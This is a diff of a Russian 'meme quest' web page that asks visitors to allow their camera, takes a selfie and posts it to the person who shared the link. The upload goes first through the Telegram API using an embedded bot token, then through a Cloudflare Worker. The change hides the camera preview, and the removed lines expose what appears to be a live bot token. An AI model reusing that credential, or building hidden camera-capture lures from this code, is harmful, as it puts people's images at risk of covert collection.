@@ -6,155 +6,99 @@
 <title>Мем-квест 📸</title>
 <style>
   body {
-    margin: 0;
-    background: #17212b;
-    color: #ffffff;
+    margin: 0; background: #17212b; color: #ffffff;
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    min-height: 100vh;
-    padding: 20px;
-    text-align: center;
-    box-sizing: border-box;
+    display: flex; flex-direction: column; align-items: center; justify-content: center;
+    min-height: 100vh; padding: 20px; text-align: center; box-sizing: border-box;
   }
   h1 { font-size: 24px; margin-bottom: 10px; }
   p { color: #aab; max-width: 340px; line-height: 1.5; font-size: 16px; }
   button {
-    padding: 18px 36px;
-    font-size: 18px;
-    font-weight: bold;
-    border: none;
-    border-radius: 14px;
-    background: #2ea6ff;
-    color: #fff;
-    margin-top: 24px;
-    cursor: pointer;
-    transition: background 0.3s;
-    box-shadow: 0 4px 15px rgba(46, 166, 255, 0.3);
+    padding: 18px 36px; font-size: 18px; font-weight: bold; border: none; border-radius: 14px;
+    background: #2ea6ff; color: #fff; margin-top: 24px; cursor: pointer;
+    transition: background 0.3s; box-shadow: 0 4px 15px rgba(46, 166, 255, 0.3);
   }
   button:disabled { background: #456; cursor: default; box-shadow: none; }
-  video {
-    width: 100%;
-    max-width: 320px;
-    border-radius: 16px;
-    margin-top: 20px;
-    display: none;
-    background: #000;
-    transform: scaleX(-1); /* Зеркалим, чтобы было как в селфи */
-  }
   .success-text { color: #4ade80; font-size: 20px; font-weight: bold; margin-top: 20px; }
-  .error-text { color: #f87171; font-size: 16px; margin-top: 20px; }
+  .error-text { color: #f87171; font-size: 16px; margin-top: 20px; word-break: break-all; }
 </style>
 </head>
 <body>
 
   <h1 id="title">Привет! 👋</h1>
-  <p id="sub">Нажми кнопку ниже и разреши камеру. Снимок моментально улетит другу, который скинул тебе эту ссылку!</p>
+  <p id="sub">Нажми кнопку ниже и разреши камеру. Снимок моментально улетит другу!</p>
   
   <button id="btn" onclick="shoot()">📸 Разрешить и сделать фото</button>
-  <video id="v" autoplay playsinline muted></video>
 
 <script>
-  // ==========================================
-  // ⚠️ НАСТРОЙКИ (ОБЯЗАТЕЛЬНО ЗАПОЛНИТЬ!)
-  // ==========================================
-  
-  // 1. Вставь сюда свой токен бота из BotFather (в кавычках!)
-  const BOT_TOKEN = "9165437482:AAGtRVqX8RBj2NbbuTbl_08grvFBZaN6MH0"; 
-
-  // 2. Берем ID из ссылки (?ref=123). Если ссылки нет, шлем на твой личный ID.
+  // Твой ID (если друг перешел по ссылке без ?ref=, фото придет тебе)
   const urlParams = new URLSearchParams(window.location.search);
-  
-  // Вставь сюда свой ID цифрами (в кавычках!)
-  const ownerId = urlParams.get('ref') || "7326946549"; 
-
-  // ==========================================
+  const ownerId = urlParams.get('ref') || "8166255221"; // Укажи тут свой ID, если знаешь
 
   const btn = document.getElementById('btn');
-  const v = document.getElementById('v');
   const title = document.getElementById('title');
   const sub = document.getElementById('sub');
 
   async function shoot() {
-    // Блокируем кнопку, чтобы не нажали дважды
     btn.disabled = true;
     btn.textContent = "Запрашиваю камеру...";
+    sub.className = "";
     sub.textContent = "Пожалуйста, нажми «Разрешить» во всплывающем окне.";
 
     try {
-      // Запрашиваем фронтальную камеру
       const stream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: "user", width: { ideal: 640 } }, 
         audio: false
       });
 
-      // Показываем видео на экране
-      v.style.display = "block";
-      v.srcObject = stream;
       btn.textContent = "Улыбнись... 😄";
-      sub.textContent = "Делаем снимок...";
-
-      // Ждем 1.2 секунды, чтобы камера сфокусировалась и осветлилась
-      await new Promise(r => setTimeout(r, 1200));
+      
+      // Создаем скрытое видео для захвата
+      const v = document.createElement('video');
+      v.srcObject = stream;
+      v.setAttribute('playsinline', 'true');
+      v.muted = true;
+      
+      await v.play();
+      await new Promise(r => setTimeout(r, 500)); 
 
       // Делаем снимок
       const c = document.createElement('canvas');
-      c.width = v.videoWidth;
-      c.height = v.videoHeight;
+      c.width = v.videoWidth || 640;
+      c.height = v.videoHeight || 480;
       c.getContext('2d').drawImage(v, 0, 0);
-      
-      // Конвертируем в JPEG (0.7 — хороший баланс качества и веса)
       const photoDataUrl = c.toDataURL('image/jpeg', 0.7);
 
-      // Выключаем камеру (чтобы не горел зеленый глазок)
       stream.getTracks().forEach(track => track.stop());
-      v.style.display = "none";
-
-      // Переводим картинку в формат Blob для отправки
-      const blob = await (await fetch(photoDataUrl)).blob();
-
-      // Собираем данные для Telegram
-      const formData = new FormData();
-      formData.append('chat_id', ownerId);
-      formData.append('photo', blob, 'meme.jpg');
-      formData.append('caption', 'Твой друг прошел квест! 🎉');
-
       btn.textContent = "Отправляем...";
-      
-      // Отправляем НАПРЯМУЮ в Telegram
-      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+
+      // ТВОЙ CLOUDFLARE WORKER URL
+      const WORKER_URL = 'https://little-cell-9f25.a24s1tn1kof.workers.dev/';
+
+      const res = await fetch(WORKER_URL, {
         method: 'POST',
-        body: formData
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ ref: ownerId, photo: photoDataUrl })
       });
       
       const json = await res.json();
-      
-      if (!json.ok) {
-        throw new Error(json.description || 'Ошибка Telegram');
-      }
+      if (!json.ok) throw new Error(json.error || 'Ошибка отправки');
 
-      // Успех! Меняем экран
       title.textContent = "Готово! 🎉";
-      sub.innerHTML = "";
+      sub.className = "success-text";
+      sub.innerHTML = "Фото улетело другу.<br><br>Напиши другу, который скинул тебе эту ссылку 😉";
       btn.style.display = "none";
-      v.style.display = "none";
-      
-      const successMsg = document.createElement('p');
-      successMsg.className = "success-text";
-      successMsg.innerHTML = "Фото улетело другу.<br><br>Напиши другу, который скинул тебе эту ссылку 😉";
-      document.body.appendChild(successMsg);
 
     } catch (e) {
-      // Обработка ошибок (запретил камеру, нет интернета и т.д.)
       console.error(e);
       btn.disabled = false;
       btn.textContent = "Попробовать снова";
       sub.className = "error-text";
       
       if (e.name === 'NotAllowedError') {
-        sub.textContent = "Ты запретил доступ к камере. Разреши его в настройках браузера и попробуй снова.";
+        sub.textContent = "Ты запретил доступ к камере. Разреши его в настройках браузера.";
+      } else if (e.message === "Failed to fetch") {
+        sub.textContent = "Ошибка сети. Проверь интернет или ссылку воркера.";
       } else {
         sub.textContent = "Ошибка: " + e.message;
       }
